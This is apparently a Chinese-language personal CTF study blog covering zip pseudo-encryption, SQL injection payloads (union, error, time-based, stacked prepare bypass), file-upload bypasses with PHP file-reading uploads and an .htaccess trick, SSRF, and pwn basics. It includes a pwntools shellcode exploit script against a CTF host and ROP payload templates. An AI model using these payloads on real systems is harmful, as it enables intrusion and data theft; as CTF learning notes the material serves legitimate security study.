---
title: ctf
date: 2026-06-03 14:37:00
banner: /images/banner.svg
tags:
  - ctf
categories:
  - CTF
---

# MISC

## 一、伪加密和真加密

对于zip文件而言，放到winhex中查看二进制文件程序，格式如下：

```
压缩源文件数据区：
50 4B 03 04：这是头文件标记  （0x04034b50）
14 00：解压文件所需 pkware 版本
00 00：全局方式位标记（判断有无加密） //重点
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
```

```
压缩源文件目录区：
50 4B 01 02：目录中文件文件头标记  （0x02014b50）
1F 00：压缩使用的 pkware 版本
14 00：解压文件所需 pkware 版本
00 00：全局方式位标记（判断是否为伪加密）//重点
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
```

全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：
第二个数字为奇数时 –>加密 
第二个数字为偶数时 –>未加密
因此，我们只需要看和修改第二个数字就可以，对于伪加密而言，只需要定位到目录区然后修改文件另存为，即可正常解压

# WEB基础

## 一、SQL经典注入

### 1.基本union注入

利用union语句进行注入时，前后两句select语句必须查询相同数量的列，因此利用order by语句进行列的个数的查询。

在查询完有的列数过后，查询每列对应的可行字符（在查找过程中，例如查找的username或者数据库名等应为字符型，需要将其在能够进行字符回显的列进行查找，否则会报错）

以order by 2为例子

```
'+union+select+'a',NULL+--+
```

此为检测第一列是否为字符型

```
'+union+select+1,NULL+--+
```

此为检测第一列是否为数字型

第2，3列同理。

**之后需要检测哪一列可以回显具体数据**

遇见只有一列但是需要多个回显的时候利用此数据库的单个列显示多个值

一个例子为

```
select+1,username||`~`||password+from+users
```

在此数据库中||为分隔符号，可以将username,~,password在一列中显示，具体使用时需要查找对应的数据库的分割符号。

#### **1.查询数据库名：**

```
select 1,2,group_concat(schema_name) from information_schema.schemata
```

#### 2.查询表名：

```
select 1,2,group_concat(table_name) from information_schema.tables where table_schema = `数据库名`
```

#### **3.查询列名：**

```
select 1,2,group_concat(column_name) from information_schema.columns where table_name=`表名`
```

#### 4.查询数据

```
select 1,2,(列名) from 表名 //此处表名不加引号
```

**注意在等号后面不是引号==‘’==**，而是反引号==··==

在查询完基本信息之后就可以进行一系列的绕过和查找了

### 3.内含cookie的基本进程

在网页抓包后若有如下形式

```
cookie: cookie名字 = .....
```

则为处理含cookie的请求

此时程序会将cookie放入sql语句中进行查询

```
select ... from ... where cookie名字 = ... 
```

而cookie查询的结果不会反显给用户，若查询成功，则进入下一步，若查询失败，则多半会 报错（即是不会有数据回显，但是会有特定字符来告诉语句是否执行成功）

网页检验cookie时，是将cookie中的值放入select语句中进行查询

比如：

```
cookie:tid = abc
```

就是存在一个select语句如下

```
select ... where tid = 'abc' 
```

因此在含有cookie，进行sql注入时，需要改cookie的值，方法和改列表（username和password）一样，只是没有明显的数据回显。

### 4.盲注sql

#### 1.基本原理

应用程序中很多情况下利用sql语句注入但是没有名字的回显，只有提示词的回显，因此盲注sql更加常用，利用一个个注入点的比较从而得到所需要的数据，盲注多半会配上python代码或者burp中的**burp intrude**模块（自动化攻击）

#### 2.基本方法

##### 1.基于错误的注入返回格式：

利用正确的sql语句，查询不存在的表从而导致报错的出现，便可以判断此表是否存在，以此类推

##### 2.基于详细的错误信息：

有时候生成的错误信息中会包含着sql查询的内容，在无法通过正常的sql注入回显答案时，可以用详细的错误信息进行报错处理，例如

```
select example_column from example_table
```

此语句为正确sql语句查询，但是若此语句无回显，并且具有详细的sql报错信息时，便可以主动构造报错，如

```
cast((select example_column from example_table)as int) //强制将字符改为int，数据不兼容，报错
```

便有可能产生以下报错：

```
ERROR: invalid input syntax for type integer: "Example data"
```

即可得到正确结果

##### 3.基于时间延迟的信息

需要应用程序的响应依赖查询的时间

基本原理和代码

```
';if(条件) waitfor delay '0:0:10'+--+
```

**注意分号**

若条件为真，则响应延迟10秒，反之不然

### 5.sql查找基本绕过

#### 1.对于web应用的防火墙绕过

有时候应用程序不会进行sql查找数据，而是进行html语言中的标签去进行查找数据，此时无法通过正常的sql语句去进行注入，需要将正常的sql注入语句编码为**html实体编码**放在html中进行注入，即是在查询抓包给出的html标签中进行注入

设有如下查询

```
<标签> 1 <标签>
```

则注入为

```
<标签> 1 (union select ...)(此处union的查询需要进行html实体编码，且中间为空格不需要加号) <标签>
```



#### 2.双写绕过

原理：在代码的后台绕过中，会将特定字符的出现变为空白，例如若过滤or，则在用户输入or时会显示空白，此时输入oorr，中间的or会因为过滤导致消失，从而oorr会变成or

~~一般情况下不会，似乎也不能多次检验~~

==在判断过滤的时候，可以使用sql语句查看报错==

例如（在单引号过滤情况下）输入下列语句：

```
1' or '1' = '1
```

此时若过滤掉or，则语句应变为

```
1' '1' = '1
```

很显然是个错误的sql语句

因此系统会进行此语句的报错，在报错显示中可以发现报错的语句中没有or，因此可以判断时过滤了or

==selece,information等等都可以这样判断==

#### 3.预处理绕过

**格式：**

```
-1';SeT+变量名=绕过方法；prepare 语句名字 from 变量名；execute 语句名字；#
```

**SeT的大小写时固定的**

**SeT用于设置变量名**

**prepare用于预备语句，并给这个语句赋予名称**

**execute用来执行语句**

**#号只是用来过滤掉原本select语句后面的引号**

利用sql语句的预处理和select flag的16进制编码进行绕过

例如：

```
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

此语句翻译出来就是：

```
select * from `1919810931114514`
```

若为普通连接绕过则可以写

```
1';SeT@a=CONCAT('se','lect * from `1919810931114514`;');prepare execsql from @a;execute execsql;#
```

==@a均为变量名，可以改变==

## 二、文件上传漏洞

### 1.抓包修改

#### 1.bp抓包包内修改格式：

**1.Content-Type**：代表题目所需要的文件格式，抓包时可以修改此处格式从而达到绕过需求

**2.referer：**代表了从哪个地方访问的网页，若题目要求只能从一个地方访问此网页，则修改此处

**3.X_forwarded_for：**请求端的真实ip，如果题目要求只能是本地进行，则将此改为127.0.0.1

##### 4.注意cookie， 通常use=0为错误，要修改为1

### 2.传参方式变更

在正常代码中存放有些需要用post方式传参，但是抓包给出的是get方式传参，因此需要修改，bp抓包中可以直接进行修改

两者区别：
GET传参缺少的部位：**Content-Type、Content-Length、Origin**、post传参内容，当然Origin不一定需要，但其他内容是必须的。

### 3.抓包修改两种回显区别和操作

**！！！注意，抓包修改有两种方式，假设只允许接受图片，但是上传为test.php文件！！！**

```
1.将test.php修改为test.png然后上传，接着在bp里面抓住这个上传的包，将文件后缀名改回php再放行即可
2.上传php文件后抓包，将Content-Type改为image/png然后再放行
//两种方法在本质上都是修改Content-Type为image/png
```

抓包错误回显有两种

```
1.Only image/jpeg and image/png are allowed
//此回显为检测Content-Tpye，可用上述方法
2.only JPG & PNG files are allowed
//此回显表示检测文件后缀名是否为.png等等，不能用上述方法，需要对后缀名进行绕过操作
```

#### 1.过滤Content-Type（只验证Content-Type）:

方法如上，只需要抓包修改即可

#### 2.过滤Content-Tpye并且存在格式验证：

此种情况下不能进行抓包修改，以过滤jpg文件为例子
jpg文件会以**FF D8 FF**开头，因此后台文件检验会检验这个

利用exiftool进行文件修改和绕过

```
1.创建一个jpg文件
2.wsl下利用exiftool，输入
exiftool -Comment="<?php echo 'START ' . [file_get_contents('/home/carlos/secret')] . ' END'; ?>" [upload].jpg -o [upload].php
//[]标注中的代码可进行对应性修改
//得到的回显会在输出的“START”到“END"之间
```



#### 3.过滤后缀名（此操作可以抓包后再进行修改，即不用改Content-Type）：

以过滤.php文件为例：

##### 1.进行双写：

```
有些会过滤掉.php，也就是直接删除.php，和sql双写注入有点像，上传文件时候可以传入upload.p.phphp(经过服务器删除后变为upload.php)
```

##### 2.多个扩展名

```
有些服务器前端和后端的检测不一样
提供upload.php.png，后端可能会识别为.php文件，前端识别为.png文件
```

##### 3.对点，对斜杠等等利用URL编码

```
提供upload%2Ephp
```

##### 4.利用%00或者分号进行绕过

```
存在前端验证时java或者其他高级语言所写，后端服务器为C++/C所写，利用C语言中分号的特性以及字符串遇见%00就停止的特性
上传upload.php%00.png进行绕过
```



### 4.对于上传文件导致泄露（不存在文件过滤）

对于不存在任何文件过滤的情况下，上传了一个得到shell的文件后，例如

```
<?php echo file_get_contents('/path/to/target/file'); ?>
其为输出相对应文件路径的文件内容
一般情况下，在上传了文件之后，需要修改发送包的第一行，改为访问此文件
例如：
发送上述代码文件后，修改第一行为：
GET /files/avatars/upload.php HTTP/1.1
就可以输出文件内容
```

<u>**文件上传，代表了访问这个文件可以做出相对应的代码功能，但是不代表上传了就可以做出这个功能，需要在请求包中去访问这个文件才可以**</u>

### 5.对于文件有访问过滤（即对于一个目录下的文件不允许用户执行）

绕过方法：

1.将文件上传至其他目录：

一般情况下防御会使得用户能够上传的文件目录不允许执行，因此可以尝试上传到其他目录下：

```
原上传代码：
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
修改后：
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
//注意，../表示将此文件上传到上一级目录，在get访问的时候也要加上../表示上一级目录的访问
```

**注意，如果修改为../filename后回显的依旧是上传filename等等表示'/'被过滤的消息等，考虑使用url编码，如：**

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" // 'l'的url编码为..%2f
```

### 6.对于黑白名单的过滤

一般为了加固防御以及防止漏洞，会将自己的程序列入白名单，一些常见的webshell的文件后缀名列入黑名单内，例如在无法上传php文件的时候，可以考虑一种情况(一般情况下只会过滤php等后缀名，不会过滤**.htaccess**)：

```
上传文件
文件的filename改为.htaccess
修改文件Content-Type为text/plain
修改文件内容为：AddType application/x-httpd-php .l33t（可替换）
```

内容中**AddType application/x-httpd-php ==<u>.l33t</u>==**（可替换）

.I33t可以换为.png等等后缀名（！注意，**一定要加==.==**）

作用为将自己输入的.I33t等文件按照php文件进行执行

## 三、备份网站漏洞

一些网站在搭建的时候会进行备份，需要从备份的文件中找到flag

kali linxu中输入：

```
dirsearch -u 网址
```



### 1.基本备份文件后缀：

tar.gz，zip，rar，tar

### 2.常见网站源码备份文件名：

web，website，backup，back，www，wwwroot，temp

## 四、php代码审计

### 1.php协议

#### 1.php://filter使用

将php的源码直接输出出来而不是运行

```
php://filter/read=convert.base64-encode/resource=[文件名]
```

此时前面加入传入的参数，例如以get形式传入file，则输入

```
?file=php://filter....
```

后面的输入和上面一样

### 2.php反序列化和序列化

~~遇见在说~~

### 3.php字符串解析特性

PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】

部分函数：

```
1. var_dump() —  函数用于输出变量的相关信息
2. scandir() — 列出指定路径中的文件和目录。
scandir('/')表示输入根目录下的文件
如果存在过滤，就用ascii码，比如scandir(chr(47))
3. file_get_contents() — 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
4. 字符连接：
比如我希望输出/flag内的内容，在过滤的情况下，用.连接，如下：
password=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 
也有种
password=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 
第二种加了数字和分号，也能正常输出，可能可以绕过只允许password输入字符的情况
```



## 五、路径遍历

注意关注的点

```
/a/b/c/d 表示a目录下的b下的c下的d
```

其中在路径遍历的时候也可以用到

```
/a/b/../../123 其中../表示向上一个层级，然后就可以询问和上一个目录同等级的其他目录
```

## 六、SSRF漏洞利用

基于服务端的一种恶意漏洞利用，在本机上利用服务端从而访问内网信息

由攻击者构造payload，在服务端进行发送，从而利用服务端发送去访问一些内网信息

### 1.常见过滤

#### 1.编码过滤：

对于一些后端中存在检测关键代码如127.0.0.1等信息或者admin等信息的时候，可以采用URL编码过滤，例如a可以写为**%61**，有时还可以进行两次**URL**编码过滤（即是过滤百分号%），百分号%的编码为%25，从而a可以写为**%2561**

#### 2.开放重定向利用

**原理：**URL地址中填写的参数是另一个网页地址，从而重新定向到自己需要的网页

**漏洞代表：**例如在一个网购页面， 点击可以到下一个商品页面，此中就有可能包含重定向

### 2.对于SSRF的检测

利用burpsuit中的ssrfking工具

首先先复制需要进行检测的根目录放进burpsuite中

其次将页面中的可点击页面都过一遍bp（抓包和放行）

最后会在首页显示出SSRF漏洞，之后进一步检测即可

# pwn基础

## *调试技巧：

gdb的调试就是，放在哪一行，程序就运行到哪一行

###  1. b *$rebase(0x相对基址偏移) 

一般情况下遇见pie开启的程序需要使用这个进行断点设置，其中相对基址偏移直接就是ida打开的那个地址（也就是说ida里面的那个地址其实就是相对偏移地址）

因为这个保护其实本质上是修改了基地址而已

## *patchelf修改pwn的libc环境

```
1. strings 题目给的libc版本 | grep ubuntu
2. 在glibc-all-in-one中输入
./download （第一行代码回显的那个ld连接器）
下载的将会存在glibc-all-in-one/libs/下载的东西 中
意思就是下载的是个文件夹，进去了会找到绿色的文件，例如ld-2.23.so，我们要的是这个文件的路径
3. patchelf --set-interpreter 新的ld文件的路径 程序名//修改ld
4. ldd 程序名
5. patchelf --replace-needed 原来第二行的==>前的libc名 新的libc文件的路径 程序名
//不能用那种将libc托进桌面的文件，必须使用glibc-all-in-one中的文件
```

如下图示例：

![image-20250805110439396](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250805110439396.png)

## 动态调试例子：

题目：

函数chall:

![image-20260530112732585](./../../AppData/Roaming/Typora/typora-user-images/image-20260530112732585.png)

函数vuln：

![image-20260530112801391](./../../AppData/Roaming/Typora/typora-user-images/image-20260530112801391.png)

payload为：

```
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
context.arch = "i386"
#context.log_level = "debug"

#p = process(elf.path)
p =remote("bea177b4.tcp-ctf2.dasctf.com", 9999, ssl=True)
p.recvuntil(b"Yippie, lets crash: ")
s_addr = int(p.recvline().strip(), 16)
log.info(f"s = {hex(s_addr)}")

p.recvuntil(b"> ")

shellcode = asm(shellcraft.sh())

payload = b"crashme\x00"
print(0x1c + 26)
print(len(payload))
print((0x1a - len(payload)))
payload += b"A" * (0x1a - len(payload))
#payload += p32(s_addr - 0x0a)          # 跳到 memcpy 后的 shellcode 副本
payload += p32(s_addr - 0x1c)                 # 跳到 memcpy 的参数处，直接 memcpy 出 shellcode
#payload += b"\x90" * (0x30 - len(payload))
#payload += shellcode
payload += shellcode

p.sendline(payload)
p.interactive()
```

开始分析：

```
最大问题点，此处是
memcpy(dest, &src, n);
而不是
memcpy(dest, src, n);
注意两者区别

栈地址 -> 内存地址
下面那一种是拷贝内存地址里面的内容，而上面那一种是拷贝栈地址的内容
```

现在的问题在于我是拷贝的是栈的地址而不是直接拷贝我输入的内容，那么此处我dest虽然有0x32个字节，但不都是我输入的内容，因此要考虑从多少开始是我输入的拷贝（因为拷贝的是栈上的地址，而不是直接拷贝输入的内容）

因此进行动态调试

断电打在进入vlun，执行memcpy前

![image-20260530113702330](./../../AppData/Roaming/Typora/typora-user-images/image-20260530113702330.png)

为何能确定edx的值是输入s的值，为何能确定第一个框是第一个参数

```
因为基本结构是
[ebp]     saved ebp
[ebp+4]   return address
[ebp+8]   第一个参数 s
[ebp+0xc] 第二个参数 0x400
看ida得出
所有第一个参数指向的内容就是原本的内存地址，所有被指向的0xffffc2ac就是s的内存地址，所以第二个红框就是内存地址
```

接下来便是确定我们的溢出以及对应的操作

```
1. 我们知道是从栈上的地址进行拷贝，因此是从0xffffc290拷贝，我们发现我们的输入在0xffffc2ac，中间隔了0x1c个字节，也就是说，我们输入的字符串能够真实写进dest里面的是0x32 - 0x1c = 0x16个字节，再加上0x4的字节（ebp），就是0x1a个字节
2. 所有我们原始的s填充的垃圾数据不是0x32 + 0x4，而是0x1a个字节（如果此处是直接拷贝的src而非&src，那么填充应该是0x32 + 0x4）
3. 所以填充0x1a
```

最后为什么返回地址要写（s_addr - 0x1c）

```
首先我们shellcode写入的地方为s_addr + 0x1e
(因为写了0x1a个垃圾字节加0x4的ebp)
现在我们进行拷贝，我们拷贝到了dest里面，dest是ebp - 0x32
也就是s_addr - 0x1c - 0x4 - 0x4 - 0x32 =  s_addr - 0x56(两个0x4分别是ebp和返回地址)

所以相当于我要先拷贝0x1e + 0x1c个过去(0x1e是s里面的垃圾字节，0x1c是栈里面拷贝过去的)，因此dest里面shellcode的位置为0x56 - 0x1e - 0x1c = 0x1c
因此shellcode在dest里面的位置就是s_addr - 0x1c（在dest里面的位置）

此处为什么不能写原本的s_addr + 0x1e，也就是在s里面的位置，因为拷贝的时候dest和s会重合，拷贝会破坏s里面书写的字符串，只能用dest里面的shellcode

```

## ARM架构启动和调试命令

```
启动：
qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn
调试：
qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./pwn
然后另一个终端启动
gdb-multiarch ./pwn
然后远程连接
target remote :1234
```



## 一、基础常识和概念：

构建system(sh)， system(bin/sh)都可以（字符串好像可以省略）

但是系统调用必须构建完全

### 1.关于栈的一些知识

栈分布，rsp和rbp，rsp一定是在栈顶（栈上最小的值），如果向**栈中写东西**，或者进行call等指令需要**push**一个东西，**则rsp是减小**，因此如果有**偏移地址，加上任意一个数，比如0x8等等，就可以在栈上寻找到对应的值**

```
add rsp,8 //将栈往上移动，此时有可能会跳过栈中的一个payload
比如说
add rsp,8
pop r5
我们如果想写入r5，则payload需要写两个数据，其中一个数据只是占位置！！！！：
payload = p64(杂糅数据) + p64(写入r5的数据)
因为add rsp, 8，将rsp往上抬了一个位置，会直接跳过杂糅数据。
```

栈上有两个东西，==**栈的地址**==（栈上给这个格子开的地址）和==**栈中存放的值**==（栈上这个格子内的数据）（注意，栈中存放的值也有可能是栈的地址）

```
0x7f7f7f7f -> 0x78787878
其中0x7f7f7f7f是栈的地址，而0x78787878是这个栈地址中存放的数据地址
```

一些例子：

我们输入变量的时候，相当于输入==**栈中存放的值**==，我们通过write等函数泄露出栈的内容，泄露出的也是==**栈中存放的值**==。

**而**我们在构造rop链的时候，通过偏移找到的位置是==**栈的地址**==，我们想要调用一些变量，也是调用==**栈的地址**==，比如我们写入/bin/sh/在一个变量中，后面想要利用bin_sh时，比如函数构造，利用的是这个变量的地址，也就是==**栈的地址**==（栈中给这个变量开的地址）

一些函数调用也会区分这个，比如call指令，有些程序中会存在call [r12]

此时表示的是将r12这个地址里面存放的内容当作一个地址，再去找里面的内容进行call

```
也就是说
r12 -> a
a -> b
call [r12] == call b
```

因此这种情况下，r12必须是**栈的地址而不是栈中存放的地址**

==**一定要注意每一个函数或者程序的ret指令，一定一定，这个会改变栈，一定要自己模拟**==（还需要注意像call指令等带来的**push rip**从而导致**栈空间改变**，可以在栈上构建payload，比如构建pop_rdi，ret 这个就会将call指令后压入栈中的rip放到rdi中，从而保证ret能正确回到payload上）

### 2.shellcode书写小技巧

先手写，再填充，写框架后补充内容

注意，shellcode写在栈上进行利用，注意，==**栈上一开始一定是没有东西的**==，如果shellcode需要设置多个参数，比如存在

```
pop rbp
pop rbx
pop r12
等等
```

可以写将这些东西手写出来，先计算出栈每个空间应该对应的东西（也就是计算栈空间每个数据的值），然后最后再根据偏移填充值

例如：

```
一个栈空间如下：
mov_rax   ...
aaaaaaaa  ...
pop r12   ...
pop rbx   0x10
pop rbp   0x8
bin_sh... 0x0
...
```

先写出上述栈空间分布，最后再去填充，比如我们希望r12的地址为mov_rax的栈地址（此处只是举例，填栈地址的原因有可能是存在指令call [r12]，如上述），则可以利用偏移地址，可填写bin_sh + 0x28（这个地址里面就是mov_rax）

==**对于栈是否需要清理以及栈帧的理解**==

**为什么ret2libc调用回到main函数时，前面write等传入的参数不用清理，为什么下面这种情况需要清理栈**

**！！！**这个关于栈帧的理解，在ret2libc中，回到main函数时，会存在这样的汇编指令（类似如下）

```
.text:08048E24 55                   push    ebp
.text:08048E25 89 E5                mov     ebp, esp
.text:08048E27 83 E4 F0             and     esp, 0FFFFFFF0h
.text:08048E2A 83 EC 30             sub     esp, 30h
```

这个就是将ebp保留，将esp上移，也就是说，当我们回到main函数的时候，栈会向上移动，跳过我们之前留下的含有参数的栈，也就是这个函数会开一个全新的空栈，而下面的read函数等等，他们的汇编指令如果不存在新开栈空间，则就要清理原本的栈空间

对于调用函数导致栈上存放数据要pop了之后才能正常进行操作，比如说存在

```
read(0, bss, 8)，后续我们希望有利用pop edx, pop ecx 将二者变为1和2，此时栈上首先存放的是：
read_addr
0
bss
8

read_addr会被弹出栈进行读入，但是后面的参数不会，因为我们是在栈上进行的操作，我们需要先将三个东西参数栈，才能继续书写，也就是说我们的payload构建应该为（假设32位，存在返回地址）
read_addr
pop(0, bss, 8)_addr(弹出下面的三个参数)(返回地址)
0
bss
8

```



### 3.对于栈中变量的理解

在我们对于一般的变量进行输入的时候，是直接存放在栈空间中的，在之后我们如果需要再次使用此变量中的东西，比如说，我向变量里面写了一个'/bin/sh'，在之后我要使用，就需要知道这个字符串在的地址（也就是**栈的地址**）

一般方法为泄露出栈上的地址，然后计算出泄露出的地址和变量地址的偏移值，用泄露出的地址减去偏移值就可以得到变量地址，即可以使用

### 4.关于找到栈基址

**在本地运行调试**，利用write等函数可以打印多个字符的条件，首先进入pwngdb中查看栈空间，也就是判断第一个可打印的栈地址离rsp距离是多少，然后加上变量和栈顶的距离,p.recv()后，接受了就是泄露出来的栈上地址的内容，同理，libc中_libc_start_main等函数也可以这样找到，然后计算其和变量的地址偏移，之后就可以利用这个偏移和泄露出来的地址找到变量地址从而进行变量使用了

**计算方法**：找到stack中存**放文件名字**的地方（这个地方位arg[0]，在栈上），他和rbp的距离，假设为a，其次，找到变量和rbp的距离，假设为b，则接受字节的大小为a + b，也就是**p.recv(a + b)**，注意，在调试中rbp是包含进去了的，不需要额外加rbp的大小

**计算偏移**：直接在调试中进行计算，计算泄露的地址（注意是此地址内的内容才是打印出来的内容）和变量地址的偏移

接收使用

```
addr = u64(r(num).ljust(8, b'\x00'))
//这个为接收泄露出来的地址，如果要计算变量地址则要加上计算偏移
//其中num为字节大小，自己进入gdb中调试然后自己数（两个数字一个字节）
```

### 5.基本函数和系统使用

#### 1.**sprintf()**

sprintf表示将内容打印到字符串中，

```
sprintf("字符串"，格式化字符串（%d这类），内容)
//代表将内容输入到字符串中
例如：
sprintf(str,"%3d", a)
```

#### 2.read()

read()表示将文件所指的内容输入到buf中

返回值为实际读取的字符个数，如果出错则返回-1

```
read(fd,buf,size)
//表示从文件fd中读取size个字符输出到buf中
当fd = 0时，即read(fd,buf,size)
则表示自己输入size个字符到buf中
其中size表示最大接受数量，此时buf会占size个字节，但是你可以不输入这么多，但是后续还需要输入时，计算要减去size个字节
```

#### 3./dev/urandom

此为linux中随机数生成器

```
fd = open("/dev/urandom", 0)
//代表随机数的生成
```

#### 4.strncmp

strncmp表示两个字符串前n个字符的比较

```
strncmp(str1,str2,size)
返回值小于0则str1 < str2
返回值大于0则str1 > str2
返回值等于0则str1 == str2 或者 size = 0
```

**注意！**

返回值等于0有两种情况，为**str1 = str2** 或者 **size = 0**

若size可修改，**则可以用于绕过字符串相等的判断**

对于size而言，有些时候会存在

**size = strlen(str)**

而此时由于strlen的特性，遇见\0便停止，就可以输出\x00，使str的第一个字符为\x00

```
str[0] = '\x00' //在vscode中
payload = '\x00' //真正的payload
这个占一个字节，需要减去
```

此处输入，后面再构建payload，就可以使得size = 0，从而达到绕过字符串相等的判断

#### 5.call指令

注意，此时会push rip，从而改变栈的内容，一定要注意这个！

#### 6.接收指令

```
data = p.recv(10)接收到的是byte数据，下面说明转换//
转化字符串：data = data.decode()
转换为整数32位：data = u32(p.recv(10))按照4字节转换成一个32位无符号整数
转换为整数64位：data = u64(p.recv(10))按照8字节转换成一个64位无符号整数
字符串转换为整数：int(data, 16)//16进制字符串转换为十进制数，与hex()为互逆操作，其中16可改，比如int(data, 8)，代表8进制数转换为十进制数

//转换为整数是为了方便之后计算，比如libc中计算基地址等等
假设接收到b'0x80487e0'，需要转换成16进制0x80487e0进行后续地址计算：
1. data = data.decode()//转换为字符串
2. data = int(data, 16)
```

### 6.将/bin/sh写入.bss段

步骤：

1. 在Ida中找到一个空闲的bss段，也就是后面为" ？"

2. 首先调用read函数，然后传入/bin/sh

3. 之后直接调用这个bss段地址就是调用bin/sh了

   ```
   例如：
   payload = b'a'*32 + p32(read_addr) + p32(pop_addr) + p32(0) + p32(bss_addr) + p32(8)// p32(pop_addr)只是此题目中需要清理read留下的三个在栈上的参数而已
   //上面为构造payload
   
   p.send(payload)
   p.send(b'/bin/sh\x00')
   
   发送payload后会进入read函数等待交互，因此我们就可以发送/bin/sh\x00，注意是8个字节，read中读入8字节
   
   之后就可以利用bss_addr将其赋值给需要赋值bin/sh的寄存器即可
   
   ```

   

### 7.*((_QWORD *)dest + 2)和 *(dest + 2)的区别

简单来说，(_QWORD *)会把dest变成八个字节，因此偏移就是×8，而后面就是正常的，简单来说

*((_QWORD *)dest + 2)是dest[2 * 8]，也就是dest[16]

*(dest + 2)是dest[2]



### 8.结构体的栈溢出

假设存在一个结构体，结构体里面是指针，我们要覆盖这个指针里面的内容，我们需要另外创建一个结构体去进行覆盖

![image-20251027201545995](./../../AppData/Roaming/Typora/typora-user-images/image-20251027201545995.png)



![image-20251027201553743](./../../AppData/Roaming/Typora/typora-user-images/image-20251027201553743.png)

反汇编中一定要注意看汇编代码是几级指针，从而才能知道他写入的到底是什么





## 二、基本pwn的payload格式

### 1.基础

注意payload的构建是为了覆盖**当前函数的返回值**，比如在main函数中缓冲区溢出，则需要注意覆盖的是main函数的返回值，因此需要注意在输入到返回之间是否对输出的payload有修改

```
from pwn import *
p = remote("题目链接"，端口)
payload = 'a'*数字（数字为要填满的缓冲区，算上了栈第8位（在64位程序下））
payload += p64(0x40119b).decode("iso-8859-1")
(0x40119b是题目中call给的确切地址，要根据题目进行改变)
p.send(payload)
p.interactive()
```

在sendline(payload)之后，注意要进行p.recv()

其中遇见puts函数需要的是p.recvuntil('字符 + \n')， ''\n'一定需要

此方法读取文件返回的内容，否则在之后读取，例如在libc中读取函数真实地址的时候会出错



32位用

```
p32().decode("iso-8859-1")
```

**是p64会转变成8个字节，p32会转变成4个字节**~

### 2.关于发送函数send和sendline以及发送方式

#### 1.send和sendline的主要区别：

sendline会相比于send多发一个回车，也就是sendline相当于发送一行数据

#### 2.具体使用:

遇见**<u>read</u>**函数只能用**<u>send</u>**发送

遇见**<u>scanf</u>**和**<u>get</u>**函数只能用**<u>sendline</u>**

#### 3.对于不同读取的发送

在read，get，以及用scanf读取字符串的时候和上面payload一样

在用scanf读取数字，也就是

```
scanf("%d",&a)
```

这种时，如果想让a = 100

则payload应为：

```
payload = '100' //由于用scanf读入，因此必须用sendline传送
p.sendline(payload)
```

也可以直接传输：

```
p.sendline('100')
```



### 3.str（字符串）和byte（字节串）的区别以及转换

字符串转化位字节串：

```
payload = b'a'//输入的字符前缀加b就是将字符串转化为字节串
```

以64位为例，对于p64()和p64().decode("iso-8859-1")的区别：

```
p64()//返回字节类型，可以用于将字符串转换位字节串
p64().decode("iso-8859-1")//此返回字符串类型
```

在基本payload中使用

```
payload = b'a'*0x55 + p64(main_adr) //此为基本构造，；利用byte类型进行构造
```

## 三、栈溢出基本

**找不到flag但是成功get shell之后可以用 find -name flag去寻找flag所在目录，然后cat该目录即可**

**注意，传递参数不仅仅是调用system等等，利用文件已经有的地址进行转换也算调用函数，至于存在参数过滤等等只需要按照函数参数调用步骤来就可以了，多个函数也是如此，只需要在返回值的地方写入下一个函数**

栈溢出不一定代表他一定要覆盖到返回值，有可能是溢出当前变量从而覆盖到其他变量产生一系列的操作

### 1.64位的基本信息

**==一定要区分栈的进程和主函数的ret==**，不是按照栈的顺序执行，而是按照rip进行执行，在主函数rbp下面有个ret，因此会把rbp下面的代码输进rip中，然后反复利用pop ...以及ret从而在栈上进行一系列的构造和rip的传输（进行自己想要的程序进行）

64位在进行传参的时候用rdi, rsi, rdx, rcx, r8, r9，因此在构造payload的时候，如要构造一个（64下）



==**p64（或者p32()）直接跳转的函数和elf.sym进行调用的函数是一样的，都采用正常传参调参的流程**==即要加返回地址

如果直接**p64(call指令)**就不用加返回地址（通常是存在栈溢出但是长度不够的情况下，加不了返回地址，我们找到call指令然后直接加参数就可以了）

```
system(/bin/sh)
```

需要进行：

```
pop rdi，ret（先让主函数返回地址变为这个，从而让rip为这个指令，从而让下一步进行pop rdi）
/bin/sh的地址（此时会进行pop rdi，因此会把这个地址传入rdi中，因为system的参数选用首先要用rdi）此时运行完之后，rip会指向ret
system的plt的地址/或者可以用system的地址（此时rip在ret，会将这个传给rip，因此rip会变成运行system）
从而就构造出了system(/bin/sh)的payload
最后需要输入函数的返回地址，再libc2中，此返回地址为main函数地址
```



举例需要两个参数以上，比如利用printf泄露出一个read函数的got地址：

```
patload = offset + p64(pop rdi) + p64(一个含有%s的地址，可以用文件中存在的变量地址) + p64(pop rsi) + p64(elf.got['read']) + p64(elf.plt['printf']) + p64(main_add)
//如果存在没有单独的pop rsi | ret，而是后面跟随了一个r15等，例如存在pop rsi | pop r15 | ret，则需要手动输入无关字符进行pop r15的进行，比如上述代码如果不单单是pop rsi，存在这个情况，应该为：
patload = offset + p64(pop rdi) + p64(一个含有%s的地址，可以用文件中存在的变量地址) + p64(pop rsi) + p64(elf.got['read']) + p64(0) + p64(elf.plt['printf']) + p64(main_add)
其中的p64(0)就是消除多于的pop r15
```

**在利用函数返回调用system函数时要输入call指令的地址，有些会存在system(cat /flag)等命令，则需要输入mov cat /flag这个命令的地址**

### 2.32位基本信息

在调用函数的时候和上面64位不一样，因为其没有6个寄存器传递参数，因此payload为（下面的p32()省略后面的**.decode("iso-8859-1"**)）：

具体为：要调用的函数地址+此函数返回地址+参数地址

